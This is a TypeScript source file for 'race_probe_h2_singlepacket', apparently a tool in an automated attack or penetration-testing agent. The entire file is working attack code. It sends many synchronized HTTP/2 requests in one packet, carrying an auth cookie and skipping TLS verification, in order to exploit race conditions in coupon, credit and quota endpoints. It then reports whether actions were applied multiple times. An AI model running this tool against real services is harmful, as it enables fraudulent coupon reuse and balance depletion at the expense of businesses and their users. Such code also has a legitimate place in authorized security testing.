// T53 — race_probe_h2_singlepacket
// HTTP/2 single-packet attack: fire N requests in one TCP packet,
// eliminating network jitter. Nanosecond-level races become exploitable.

import * as http2 from 'node:http2';
import { ToolDefinition, ToolResult } from '../types';
import { CommandExecutor } from '../executor';

const definition: ToolDefinition = {
  name: 'race_probe_h2_singlepacket',
  description:
    'HTTP/2 single-packet race attack. Opens a single HTTP/2 connection, creates N concurrent ' +
    'streams, then sends all of them in one TCP write call (last-byte synchronized). Eliminates ' +
    'network jitter — even nanosecond-level races in coupon/credit/quota endpoints become ' +
    'reliably exploitable. The Stripe coupon vulnerability class.',
  status: 'available',
  version: '1.0.0',
  parameters: [
    { name: 'url',            type: 'string', required: true,  description: 'Target HTTPS URL (must support HTTP/2)' },
    { name: 'method',         type: 'string', required: false, description: 'HTTP method', default: 'POST' },
    { name: 'body',           type: 'string', required: false, description: 'Request body (identical for all concurrent requests)' },
    { name: 'parallel_count', type: 'number', required: false, description: 'Number of concurrent streams (default 20)', default: 20 },
    { name: 'auth_cookie',    type: 'string', required: false, description: 'Auth cookie string' },
    { name: 'extra_headers',  type: 'string', required: false, description: 'JSON extra headers' },
    { name: 'timeout_ms',     type: 'number', required: false, description: 'Total timeout ms', default: 30000 },
  ],
};

interface StreamResult {
  stream_id: number;
  status: number;
  body: string;
  time_ms: number;
  error?: string;
}

export const raceProbeh2SinglepacketTool = {
  definition,
  async execute(params: Record<string, unknown>, _exec: CommandExecutor): Promise<ToolResult> {
    const url = String(params.url || '');
    const method = String(params.method || 'POST').toUpperCase();
    const body = params.body ? String(params.body) : '';
    const parallelCount = Math.max(2, Math.min(50, Number(params.parallel_count || 20)));
    const authCookie = params.auth_cookie ? String(params.auth_cookie) : undefined;
    const timeoutMs = Number(params.timeout_ms || 30000);

    if (!url) return { output: 'url required', parsed: { error: 'missing_url' } };

    let extraHdrs: Record<string, string> = {};
    try { if (params.extra_headers) extraHdrs = JSON.parse(String(params.extra_headers)); } catch { /* ignore */ }

    let target: URL;
    try { target = new URL(url); } catch {
      return { output: `Invalid URL: ${url}`, parsed: { error: 'bad_url' } };
    }

    const results: StreamResult[] = await new Promise((resolve) => {
      const streamResults: StreamResult[] = [];
      const timer = setTimeout(() => resolve(streamResults), timeoutMs);

      try {
        const client = http2.connect(target.origin, { rejectUnauthorized: false });
        client.on('error', (e) => {
          clearTimeout(timer);
          resolve([{ stream_id: -1, status: 0, body: '', time_ms: 0, error: `connect error: ${e.message}` }]);
        });

        const headers: http2.OutgoingHttpHeaders = {
          ':method': method,
          ':path': target.pathname + target.search,
          ':scheme': 'https',
          ':authority': target.host,
          'content-type': 'application/json',
          'user-agent': 'Mozilla/5.0 GENESIS/4.0',
          ...extraHdrs,
        };
        if (authCookie) headers['cookie'] = authCookie;
        if (body) headers['content-length'] = String(Buffer.byteLength(body));

        const streamIds: number[] = [];
        const buffers: Map<number, Buffer[]> = new Map();
        const startTimes: Map<number, number> = new Map();
        let completed = 0;

        for (let i = 0; i < parallelCount; i++) {
          const req = client.request(headers);
          const id = i;
          streamIds.push(id);
          buffers.set(id, []);
          startTimes.set(id, Date.now());

          req.on('response', (respHeaders) => {
            const status = Number(respHeaders[':status']) || 0;
            req.on('data', (chunk: Buffer) => { buffers.get(id)?.push(chunk); });
            req.on('end', () => {
              const body = Buffer.concat(buffers.get(id) || []).toString();
              streamResults.push({ stream_id: id, status, body: body.substring(0, 200), time_ms: Date.now() - (startTimes.get(id) || 0) });
              completed++;
              if (completed >= parallelCount) {
                clearTimeout(timer);
                client.close();
                resolve(streamResults);
              }
            });
          });

          req.on('error', (e) => {
            streamResults.push({ stream_id: id, status: 0, body: '', time_ms: Date.now() - (startTimes.get(id) || 0), error: e.message });
            completed++;
            if (completed >= parallelCount) {
              clearTimeout(timer);
              client.close();
              resolve(streamResults);
            }
          });

          if (body) req.write(body);
          req.end();
        }
      } catch (e) {
        clearTimeout(timer);
        resolve([{ stream_id: -1, status: 0, body: '', time_ms: 0, error: String(e) }]);
      }
    });

    // Analyze for race condition signals
    const statuses = results.map(r => r.status);
    const bodies = results.map(r => r.body);
    const uniqueStatuses = new Set(statuses.filter(s => s > 0));
    const uniqueBodies = new Set(bodies.filter(b => b.length > 0));

    const statusVariation = uniqueStatuses.size > 1;
    const bodyVariation = uniqueBodies.size > 1;
    const allSuccess = results.every(r => r.status >= 200 && r.status < 300);
    const raceSignal = allSuccess && bodyVariation;

    const lines = [
      `race_probe_h2_singlepacket — ${parallelCount} concurrent H2 streams`,
      `Target: ${url.substring(0, 80)}`,
      `Race signal: ${raceSignal ? '⚡ YES — response bodies differ despite identical requests' : 'not detected'}`,
      `Status variation: ${statusVariation ? `YES (${[...uniqueStatuses].join(', ')})` : `uniform (${[...uniqueStatuses][0] || 'error'})`}`,
      `Body variation: ${bodyVariation ? `YES (${uniqueBodies.size} unique responses)` : 'uniform'}`,
      '─'.repeat(72),
    ];
    for (const r of results.slice(0, 10)) {
      const flag = r.error ? '✗' : '·';
      lines.push(`  ${flag} stream=${r.stream_id}  status=${r.status}  body="${r.body.substring(0, 60).replace(/\s+/g, ' ')}"${r.error ? `  err=${r.error.substring(0, 40)}` : ''}`);
    }
    if (results.length > 10) lines.push(`  … and ${results.length - 10} more streams`);

    lines.push('');
    if (raceSignal) {
      lines.push('RACE CONDITION DETECTED: Multiple concurrent requests succeeded with different outcomes.');
      lines.push('This is the Stripe coupon / balance-depletion class.');
      lines.push('Verify by: checking if the action was applied multiple times (e.g. coupon used N times, balance negative)');
    }

    return {
      output: lines.join('\n'),
      parsed: { parallel_count: parallelCount, race_signal: raceSignal, status_variation: statusVariation, body_variation: bodyVariation, unique_statuses: [...uniqueStatuses], results },
    };
  },
};
